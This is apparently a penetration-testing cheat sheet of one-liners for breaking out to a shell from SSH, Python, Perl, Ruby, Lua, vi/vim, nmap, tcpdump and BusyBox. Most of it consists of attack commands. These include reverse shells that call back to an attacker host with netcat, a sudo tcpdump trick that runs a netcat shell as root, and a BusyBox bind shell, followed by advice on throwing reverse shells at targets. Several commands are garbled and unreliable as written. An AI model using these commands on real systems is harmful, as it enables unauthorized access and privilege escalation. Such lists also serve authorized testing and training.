# Breakout Shells

TTY Shell Break Out
- SSH
→ ssh user@$ip nc $ localip 4444 -e /bin/bash (Enter user's password)

- Python
→ python -c ‘import pty;pty.spawn("/bin/sh")’

- Perl
→ perl -e ‘exec “/bin/sh”; '
→ exec “/bin/sh”

- Ruby
→ exec “/bin/sh”

- Lua
→ os.execute('/bin/sh')

- In IRB
→ exec “/bin/sh”

- In Vi
→ :!bash
→ :set shell=/bin/bash:shell

- In Vim
→ ‘:!bash’:

- In Nmap
→ !sh

- In tcpdump
→ echo $;id\\n/bin/netcat $ ip 443 -e /bin/bash' > /tmp/.test chmod +x /tmp/.test sudo tcpdump -ln -i eth- -w /dev /null -W 1 -G 1 -z /
tmp/.test -Z root

- In Busybox
→ /bin/busy box telnetd -|/bin/sh -p9999
If it's not possible to add a new account / SSH Key / .rhosts file and just log in, your next step is likely to be either throwing back a reverse
shell or binding a shell to a TCP port
Your options for creating a reverse shell are limited by the sctipting languages installed on the target system - though you could probably
upload a binary program too if you're suitably well prepared
Some examples should also work on Windows if you substitute “/bin/sh -i” with “cmd.exe”
